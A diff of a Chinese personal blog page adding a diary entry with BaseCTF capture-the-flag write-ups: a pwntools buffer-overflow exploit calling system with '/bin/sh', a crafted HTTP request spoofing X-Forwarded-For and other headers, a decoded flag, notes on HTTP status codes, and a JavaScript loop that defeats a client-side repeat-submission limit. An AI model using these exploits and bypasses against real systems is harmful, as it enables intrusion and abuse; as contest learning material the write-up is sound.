@@ -381,14 +381,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    12.7k
+                    13.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    58 分
+                    63 分
                 </div>
                 
 
@@ -2078,6 +2078,123 @@ JavaScript文件（如 script.js）：用于实现网站的动态功能和交互
 备份文件：网站的备份，用于数据恢复。
 文档和说明文件（如 README.md、LICENSE）：提供关于网站的说明和使用协议。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="8-15"><a href="#8-15" class="headerlink" title="#8.15"></a>#8.15</h2><p>感冒发烧，一下吃了四五种药，晕死，写了几题又睡了半天唉</p>
+<p>写了个<code>base</code>的<code>pwn</code>然后写了俩<code>base</code>的<code>web</code>和一个<code>moe</code>的<code>web</code>，整理了一下<code>web</code>的笔记，笔记就不放了，都是些入门的</p>
+<p>好饿啊，吃了点东西全吐了，谁能莫名其妙给我点个<code>KFC</code>（bushi</p>
+<p>emmmm放没结束的比赛的exp会不会不太好，但应该没什么人看我博客吧（（（</p>
+<h3 id="我把它弄丢了"><a href="#我把它弄丢了" class="headerlink" title="我把它弄丢了"></a>我把它弄丢了</h3><p>有<code>binsh</code>有<code>system</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
+
+debug <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.basectf.fun'</span><span class="token punctuation">,</span> <span class="token number">47078</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+binsh <span class="token operator">=</span> <span class="token number">0x402008</span> 
+shell <span class="token operator">=</span> <span class="token number">0x40120F</span>
+pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401196</span>
+
+p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'her.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>直接查看源代码，注释里有<code>flag</code>(讲个笑话，还真玩了两分钟的游戏</p>
+<h3 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h3><p>谁懂，因为觉得开<code>bp</code>好麻烦，拿<code>hackbar</code>看了半天不会写</p>
+<p><code>bp</code>抓包改<code>http</code>参数</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /?basectf=we1c%2500me  HTTP/1.1
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:33834</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span><span class="token header-value">c00k13=i can't eat it</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">9</span></span>
+
+Base=fl@g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>会得到以下内容，<code>base64</code>解码即可</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span>
+<span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span>
+<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Aug 2024 07:05:41 GMT</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.4.27</span></span>
+<span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>客户端重定向</strong>：</p>
+<ul>
+<li>服务器在响应中返回一个带有302状态码的响应头，指示浏览器进行跳转。</li>
+<li>例如，服务器端脚本通过<code>header(&quot;Location: success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==&quot;);</code>指令将HTTP响应状态设置为302，然后浏览器会自动访问<code>success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</code>页面。</li>
+</ul>
+<h3 id="http响应状态码"><a href="#http响应状态码" class="headerlink" title="http响应状态码"></a>http响应状态码</h3><h4 id="1xx-信息响应"><a href="#1xx-信息响应" class="headerlink" title="1xx: 信息响应"></a>1xx: 信息响应</h4><p>这些状态码表示请求已被接收，服务器正在处理请求。</p>
+<ul>
+<li><strong>100 Continue</strong>: 客户端应继续其请求。</li>
+<li><strong>101 Switching Protocols</strong>: 服务器根据客户端的请求切换协议。</li>
+</ul>
+<h4 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx: 成功"></a>2xx: 成功</h4><p>这些状态码表示请求已成功接收、理解并处理。</p>
+<ul>
+<li><strong>200 OK</strong>: 请求成功，服务器返回请求的资源。</li>
+<li><strong>201 Created</strong>: 请求成功并导致了资源的创建。</li>
+<li><strong>204 No Content</strong>: 请求成功，但服务器没有返回任何内容。</li>
+</ul>
+<h4 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx: 重定向"></a>3xx: 重定向</h4><p>这些状态码表示需要客户端采取进一步的操作以完成请求，通常是用于重定向。</p>
+<ul>
+<li><strong>301 Moved Permanently</strong>: 请求的资源已永久移动到新位置，客户端应使用新URL。</li>
+<li><strong>302 Found</strong>: 请求的资源临时移动到新位置，客户端应继续使用原来的URL。</li>
+<li><strong>304 Not Modified</strong>: 客户端有缓存资源，且资源未被修改，可以继续使用。</li>
+</ul>
+<h4 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx: 客户端错误"></a>4xx: 客户端错误</h4><p>这些状态码表示客户端看起来有问题，导致服务器无法处理请求。</p>
+<ul>
+<li><strong>400 Bad Request</strong>: 请求有错误，服务器无法理解。</li>
+<li><strong>401 Unauthorized</strong>: 请求需要身份验证，客户端未提供有效凭证。</li>
+<li><strong>403 Forbidden</strong>: 服务器理解请求，但拒绝执行。</li>
+<li><strong>404 Not Found</strong>: 服务器无法找到请求的资源。</li>
+<li><strong>405 Method Not Allowed</strong>: 请求的方法不被允许。</li>
+</ul>
+<h4 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx: 服务器错误"></a>5xx: 服务器错误</h4><p>这些状态码表示服务器未能完成有效请求，通常是服务器端的问题。</p>
+<ul>
+<li><strong>500 Internal Server Error</strong>: 服务器遇到错误，无法完成请求。</li>
+<li><strong>502 Bad Gateway</strong>: 服务器作为网关或代理，从上游服务器收到无效响应。</li>
+<li><strong>503 Service Unavailable</strong>: 服务器当前无法处理请求，通常是由于过载或维护。</li>
+<li><strong>504 Gateway Timeout</strong>: 服务器作为网关或代理，未能及时从上游服务器获取响应。</li>
+</ul>
+<h3 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h3><p>要在表白墙提交300次，限制不能重复提交</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>getItem<span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                alert<span class="token punctuation">(</span><span class="token string">'您已经提交过表白，不能重复提交。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在控制台输入<code>localStorage.removeItem(&#39;confessionSubmitted&#39;);</code>之后即可重复提交，且在控制台就可以通过<code>document.querySelector(&#39;input[type=&quot;submit&quot;]&#39;).click();</code>提交，所以直接写个循环去提交</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">const intervalId <span class="token operator">=</span> setInterval<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
+    localStorage<span class="token punctuation">.</span>removeItem<span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span>querySelector<span class="token punctuation">(</span><span class="token string">'input[type="submit"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但有个<code>alert</code>弹窗要点确定的我不知道怎么自动点， 还是手动点的</p>
+
                 
             </div>
             <hr/>
@@ -2378,7 +2495,7 @@ JavaScript文件（如 script.js）：用于实现网站的动态功能和交互
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">122.5k</span>&nbsp;字
+                class="white-color">123.6k</span>&nbsp;字
             
             
             
